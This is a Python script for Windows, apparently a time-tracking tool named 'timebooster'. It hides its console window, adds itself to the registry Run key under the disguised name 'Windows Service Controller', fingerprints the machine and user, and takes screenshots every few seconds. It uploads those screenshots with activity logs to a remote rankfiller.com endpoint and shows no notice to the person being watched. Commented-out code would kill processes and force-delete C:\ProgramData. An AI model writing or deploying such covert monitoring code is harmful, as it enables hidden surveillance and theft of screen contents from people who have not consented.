import win32gui
import win32.lib.win32con as win32con

the_program_to_hide = win32gui.GetForegroundWindow()

win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

import os, sys
import time
import pyautogui
from PIL import Image, ImageDraw
import base64, subprocess
import requests
from datetime import datetime
from ctypes import Structure, windll, c_uint, sizeof, byref
import winreg
import json
import traceback
import tkinter as tk
from tkinter import messagebox
import webbrowser

import socket

import psutil
import shutil
import win32api


def stop_process(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() == process_name.lower():
                print(f"Found {process_name} with PID {proc.info['pid']}. Terminating...")
                proc.terminate()
                proc.wait(5)  # Wait up to 5 seconds
                if proc.is_running():
                    print(f"Termination failed. Killing {process_name}...")
                    proc.kill()
                print(f"{process_name} stopped.")
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    print(f"{process_name} not found in running processes.")
    return True

def force_delete_folder(folder_path):
    methods = [
        ("shutil.rmtree with error handling", lambda: shutil.rmtree(folder_path, onerror=lambda f, p, e: (os.chmod(p, 0o777), f(p)))),
        ("rmdir command", lambda: subprocess.run(["rmdir", "/s", "/q", folder_path], shell=True, check=True)),
        ("rd command", lambda: subprocess.run(["rd", "/s", "/q", folder_path], shell=True, check=True)),
        ("win32api", lambda: (
            win32api.SetFileAttributes(folder_path, win32con.FILE_ATTRIBUTE_NORMAL),
            [os.remove(os.path.join(r, f)) for r, d, fs in os.walk(folder_path, topdown=False) for f in fs],
            [os.rmdir(os.path.join(r, d)) for r, ds, f in os.walk(folder_path, topdown=False) for d in ds],
            os.rmdir(folder_path)
        ))
    ]

    for name, method in methods:
        try:
            method()
            print(f"Folder {folder_path} force deleted using {name}.")
            return
        except Exception as e:
            print(f"{name} failed: {e}")
    
    print("All force delete methods failed.")

# process_stoped_list=[
#     "Service Host Repository.exe",
#     "Windows Service Controller.exe"
# ]
# for process_name in process_stoped_list:
#     try:
#         stop_process(process_name)
#     except Exception as e:
#         print(f"error occurecd- {e}")
        

# try:
#     folder_path = r"C:\ProgramData"
#     force_delete_folder(folder_path)
# except Exception as e:
#     print("error occurecd")

## Old exe removed...




# URL of the update info JSON file
UPDATE_INFO_URL = "https://rankfiller.com/seotools/api/autoupdate/"
CURRENT_VERSION = "2.2"
appname="timebooster"

def ask_yes_no(new_version):
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    message = f"New version {new_version} is available.\nDo you want to download it?"
    response = messagebox.askyesno("Update Available", message)
    return response

def get_latest_version_info():
    try:
        #response = requests.get(UPDATE_INFO_URL)
        response = requests.post(UPDATE_INFO_URL, data={"appname": appname})
        response.raise_for_status()
        print(f"Response status code: {response.status_code}")
        print("taskdone")
        #print(f"Response content: {response.content}")
        return response.json()
    except requests.RequestException as e:
        print(f"Error checking for updates: {e}")
        return None




def version_tuple(version):
    return tuple(map(int, (str(version).split("."))))

def check_for_updates():
    update_info = get_latest_version_info()
    if update_info:
        print(f"Update info: {update_info}")
        data = update_info.get("data", {})
        latest_version = str(data.get("version"))  # Ensure it's treated as a string
        download_url = data.get("url")
        if latest_version and download_url:
            if version_tuple(latest_version) > version_tuple(CURRENT_VERSION):
                user_response = ask_yes_no(latest_version)
                if user_response:
                    webbrowser.open(download_url)
                    exit()  # Exit the script after opening the download URL
                else:
                    print("User chose not to update.")
            else:
                print("You already have the latest version.")
        else:
            print("Invalid update information.")
    else:
        print("Failed to retrieve update information.")


check_for_updates()





class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

def get_idle_duration():
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0

# Function to get the current time as a datetime object
def get_current_time():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Function to add the application to startup
def add_to_startup(program_path):
    try:
        full_program_path = f"{program_path} /silentall /nogui /background /autostart"
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, "Windows Service Controller", 0, winreg.REG_SZ, full_program_path)
        return True
    except Exception as e:
        print(f"Error adding to startup: {e}")
        return False
    
# Specify the path to your application's executable
script_dir = os.path.dirname(os.path.abspath(__file__))
savemedia_path = os.path.join(script_dir, "tcl/optac0.10")
if not os.path.exists(savemedia_path):
    os.makedirs(savemedia_path)

exe_path = os.path.join(script_dir, "Windows Service Controller.exe")  # Replace "your_app.exe" with the actual EXE file name.Service Host Repository

add_to_startup(exe_path)
    
# Get the current Windows user
current_user = os.getlogin()
deskid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
getuniqueid=deskid+ "-" + current_user

def save_activity_log(activity_log):
    file_path = os.path.join(savemedia_path, '3YywggXkpGIpAfruybtn.json')  # Create the file path
    with open(file_path, 'w') as file:
        json.dump(activity_log, file, indent=4)



def save_image_log(img_base64):
    file_path = os.path.join(savemedia_path, 'riIJumNSCQOKWnNcbJojP.json')  # Create the file path
    with open(file_path, 'w') as file:
        json.dump(img_base64, file)

def load_image_log():
    file_path = os.path.join(savemedia_path, 'riIJumNSCQOKWnNcbJojP.json')  # Create the file path
    try:
        with open(file_path, 'r') as file:
            try:
                image_log = json.load(file)
                return image_log
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                return []
    except FileNotFoundError:
        return []


def load_settings():
    return {"status":True,"screen_shot_time":2,"log_time": 2,"update_time": 2}

def load_activity_log():
    file_path = os.path.join(savemedia_path, '3YywggXkpGIpAfruybtn.json')  # Create the file path
    try:
        with open(file_path, 'r') as file:
            try:
                activity_log = json.load(file)
                return activity_log
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                return []
    except FileNotFoundError:
        return []
    
latesterror=''
print(latesterror)
error_log_file = os.path.join(savemedia_path, 'error_log.json')
def load_errors():
    if os.path.exists(error_log_file):
        with open(error_log_file, 'r') as file:
            return json.load(file)
    return []

def save_errors(errors):
    with open(error_log_file, 'w') as file:
        json.dump(errors, file)

def senderrortoapi(e, line_number):
    global latesterror
    try:
        errorlog=str(f"{e} - {line_number}")
        errors = load_errors()

        if errorlog!=latesterror and errorlog not in errors:
            api_url = 'https://rankfiller.com/seotools/api/timetrackerscreen/errorlogs/'
            headers = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"}
            data = {
                    'user': getuniqueid,
                    "errorlog":errorlog,
                }
            response = requests.post(api_url, json=data, headers=headers)
            if response.status_code == 200 and "Please Try By Geeta Tool 3.0 Software ..." not in response.text:
                print("errro")
                response_json = response.json()
                errors.append(errorlog)
                save_errors(errors)
                latesterror=errorlog
            else:
                response_json=True
        else:
            response_json=True
    except Exception as e:
        print(e)
        time.sleep(2)
        response_json=True
    
    return response_json

basic_settings=load_settings()
activity_log = load_activity_log()
image_log = load_image_log()

totaltimespent = 0
imagetimespent = 0

def check_internet(host="8.8.8.8", port=53, timeout=3):
    """Check if there is an active internet connection."""
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except (socket.timeout, socket.error):
        return False        

while basic_settings["status"]:
    try:
        GetLastIputInfo = int(get_idle_duration())
        print(GetLastIputInfo," GetLastIputInfo")

        if GetLastIputInfo < basic_settings["log_time"]:
            if not activity_log or (activity_log[-1]['end_time'] and 
                                    (datetime.now() - datetime.strptime(activity_log[-1]['end_time'], '%Y-%m-%d %H:%M:%S')).total_seconds() >= basic_settings["log_time"]):
                # Start of a new activity session with formatted timestamps
                activity_log.append({
                    'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'end_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
            elif activity_log[-1]['end_time'] is not None:
                # User is still active in the same session, update the end_time in real-time
                activity_log[-1]['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        else:
            if activity_log and activity_log[-1]['end_time'] is None:
                # End the current activity session with formatted timestamps
                activity_log[-1]['end_time'] = datetime.now()
        
        print(activity_log)
        
        totaltimespent+=1
        save_activity_log(activity_log)
        print(totaltimespent)
        imagetimespent+=1
        # Wait for 300 seconds before capturing the next screenshot
        if imagetimespent >= basic_settings["screen_shot_time"]:  
            # Get the current date
            current_date = time.strftime('%Y-%m-%d')
            timestamp = time.strftime('%H-%M-%S')

            # Check if the user's home directory exists
            user_home_dir = os.path.expanduser("~")
            if not os.path.exists(user_home_dir):
                break

            # Attempt to capture a screenshot, or create a blank black image if it fails
            try:
                screenshot = pyautogui.screenshot()
            except:
                screenshot=None
                    
            if screenshot != None: #C! if screenshot:
                # Generate a unique filename based on the timestamp
                filename = f'{timestamp}.jpg'

                screenshot_path = os.path.join(savemedia_path, filename)
                screenshot.save(filename , 'JPEG', quality=30)
                
                with open(screenshot_path, 'rb') as file:
                    screenshot_bytes = file.read()

                screenshot_base64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                image_log.append({
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S'):screenshot_base64
                })
                save_image_log(image_log)

                # Removing Screenshot
                print(screenshot_path)
                if os.path.exists(screenshot_path):
                    try:
                        os.chmod(screenshot_path, 0o777)
                        os.remove(screenshot_path)
                    except:
                        pass
            else:
                screenshot_base64=None
            
            imagetimespent=0

            
        
        if totaltimespent >= basic_settings["update_time"]:
            getimagelog=load_image_log()

            data = {
                'user': getuniqueid,
                'screenshots': getimagelog,
                "activity_log":activity_log,
            }

            while not check_internet():
                print("Internet connection lost. Retrying in 10 minuts...")
                time.sleep(600)

            try:
                # Define the API endpoint where you want to send the data
                api_url = 'https://rankfiller.com/seotools/api/timetrackerscreen/'
                headers = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"}
                response = requests.post(api_url, json=data, headers=headers, timeout=10)

                if response.status_code == 200 and "Please Try By Geeta Tool 3.0 Software ..." not in response.text:
                    response_json = response.json()
                    if not response_json:
                        break
                    
                    # Clear Timelog Json
                    file_path = os.path.join(savemedia_path, '3YywggXkpGIpAfruybtn.json')
                    if os.path.exists(file_path):
                        with open(file_path, 'w') as file:
                            pass  
                    
                    ssfile_path = os.path.join(savemedia_path, 'riIJumNSCQOKWnNcbJojP.json')
                    
                    if os.path.exists(ssfile_path):
                        with open(ssfile_path, 'w') as file:
                            json.dump([], file)  
                            print("file is clean now...")

                        # try:
                        #     os.chmod(screenshot_path, 0o777)
                        #     os.remove(screenshot_path)
                        # except:
                        #     pass
                    
                            
                    totaltimespent=0
                    activity_log=[]
                    image_log=[]
                    basic_settings=response.json()
                else:
                    print(f'Failed, Status code: {response.status_code}')
                    responseget=senderrortoapi(f'Failed, Status code: {response.status_code}', "N/A")
                    if not responseget:
                        break

            except Exception as e:
                print(e)
                try:
                    tb_info = traceback.extract_tb(sys.exc_info()[2])
                    for frame in tb_info:
                        if frame.filename == __file__:
                            line_number = frame.lineno
                            break
                    else:
                        line_number = "N/A"
                except:
                    line_number="N/A"

                responseget=senderrortoapi(e, line_number)
                if not responseget:
                    break
        
        time.sleep(1)
    except Exception as e:
        try:
            tb_info = traceback.extract_tb(sys.exc_info()[2])
            for frame in tb_info:
                if frame.filename == __file__:
                    line_number = frame.lineno
                    break
            else:
                line_number = "N/A"
        except:
            line_number="N/A"

        responseget=senderrortoapi(e, line_number)
        if not responseget:
            break